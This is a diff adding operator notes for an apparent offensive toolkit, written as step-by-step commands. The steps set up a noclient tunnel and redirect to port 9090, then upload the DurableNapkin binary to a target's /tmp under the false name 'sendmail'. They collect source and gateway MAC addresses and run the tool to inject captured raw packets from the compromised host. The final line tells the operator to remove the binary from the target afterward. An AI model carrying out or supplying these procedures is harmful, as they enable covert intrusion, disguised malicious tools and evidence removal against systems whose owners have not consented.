@@ -1,0 +1,97 @@
+# No tunnel is needed for the Linux bin
+
+so with one noclient: 
+-tunnel 
+l 9090 127.0.0.1 9090 
+
+and from another noclient: 
+
+-cd /tmp 
+-put /current/bin/FW/DurableNapkin/durablenapkin.solaris.2.0.1.1 sendmail 	-> put the tool up as "sendmail" 
+-ifconfig 	-> get the source mac for the PITCH 
+netstat -rn 	-> get the default gateway 
+
+# Solaris run this:
+netstat -np |grep gatewayIP 	-> get the mac for the default gateway 
+
+# Linux run this
+cat /proc/net/arp
+
+# If the gateway in not in the table.. you can ping the gateway
+
+# For solaris
+-shell 		-> run this in a shell 
+S=08:00:20:8a:8d:48 D=00:0a:41:2d:8c:80 P=9090 I=hme0 ./sendmail
+
+# (this command sets the src mac (S=) the dst mac (d=) the redir port (P=) 
+# and the interface (I=) and if you want continous running (C=) and in debug
+# mode (d=) ) 
+
+# Now you can throw THUD at using 9090 as the redir port and 127.0.0.1 for 
+# the redir listener. 
+
+# For Linux
+
+-shell
+./sendmail
+
+# Here is where it gets interesting
+# Valid commands are: SMAC, DMAC, INT, PACK, DONE, GO
+# From the data you collected up at the top, you have fill in now
+
+SMAC=SRC MAC
+DMAC=DEST MAC
+INT=INTERFACE
+PACK=PACKET (Thats right, you have to copy & paste your packet in here)
+DONE=Finished with the program (exit)
+GO <#>=SEND PACKET(S)
+
+# So as soon as you type ./sendmail you will see this:
+SMAC=(undefined)
+DMAC=(undefined)
+INT=(undefined)
+PACK=(undefined)
+
+# Simply type in your data, line by line
+SMAC=00:01:02:ce:7a:4f
+DMAC=00:19:55:df:87:26
+INT=eth0
+
+# Now just press enter on a blank line to get the status
+Current settings:
+SMAC=00:01:02:ce:7a:4f
+DMAC=00:19:55:df:87:26
+INT=eth0
+PACK=(undefined)
+
+# So now you have to actually capture your packet using a sniffing program
+# tcpdump was used in this instance
+# tcpdump -s 1500 -x host <IP or hostname>
+# Take your capture and type it in
+
+PACK="4500 0054 0000 4000 4001 01de 7d0a 1f5c 7d0a 1f5b 0800 27fe 9
+ 8346 24f2 0100 0809 0a0b 0c0d 0e0f 1011 1213 1415 1617 1819 1a1b 1
+ 2223 2425 2627 2829 2a2b 2c2d 2e2f 3031 3233 3435 3637"
+
+# Hit enter on blank line to get your settings
+Current settings:
+SMAC=00:01:02:ce:7a:4f
+DMAC=00:19:55:df:87:26
+INT=eth0
+PACK="
+45 00 00 54 00 00 40 00 40 01 01 de 7d 0a 1f 5c 
+7d 0a 1f 5b 08 00 27 fe 96 0e 00 00 a5 b7 83 46 
+24 f2 01 00 08 09 0a 0b 0c 0d 0e 0f 10 11 12 13 
+14 15 16 17 18 19 1a 1b 1c 1d 1e 1f 20 21 22 23 
+24 25 26 27 28 29 2a 2b 2c 2d 2e 2f 30 31 32 33 
+34 35 36 37 "
+
+# Now type GO to send 1 packet or type GO 25 to send 25 packets.. whatever
+
+GO
+
+# When finished completely
+
+DONE
+
+# Don't forget to remove your binary from target
